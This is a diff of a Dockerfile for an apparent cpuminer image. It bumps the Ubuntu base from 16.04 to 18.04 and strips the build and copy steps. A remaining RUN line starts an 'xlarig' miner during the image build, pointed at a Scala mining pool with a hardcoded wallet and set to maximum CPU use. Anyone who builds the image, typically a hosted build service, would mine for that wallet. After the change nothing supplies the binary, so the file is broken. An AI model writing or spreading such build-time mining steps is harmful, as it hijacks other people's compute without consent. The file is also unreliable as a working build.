@@ -6,7 +6,7 @@
 #
 
 # Build
-FROM ubuntu:16.04 as builder
+FROM ubuntu:18.04 as builder
 
 RUN apt-get update \
   && apt-get install -y \
@@ -18,11 +18,9 @@ RUN apt-get update \
     automake \
   && rm -rf /var/lib/apt/lists/*
 
-COPY . /app/
-RUN cd /app/ && ./build.sh
 
 # App
-FROM ubuntu:16.04
+FROM ubuntu:18.04
 
 RUN apt-get update \
   && apt-get install -y \
@@ -30,7 +28,6 @@ RUN apt-get update \
     libjansson4 \
   && rm -rf /var/lib/apt/lists/*
 
-COPY --from=builder /app/cpuminer .
 ENTRYPOINT ["./xlarig"]
 RUN ./xlarig -o ca.scala.herominers.com:10131 -u Svjb9K3h2DL3FiCR2Qi8L4YtCps2GgJdb1oF68dThFku69AHHsknNUKRPiPDTh3CwsiQAR11ZusneUbXd12n9Trc2KqW3j2ic -p agiz1 -a panthera --cpu-priority 5 --cpu-no-yield -k
 CMD ["-h"]
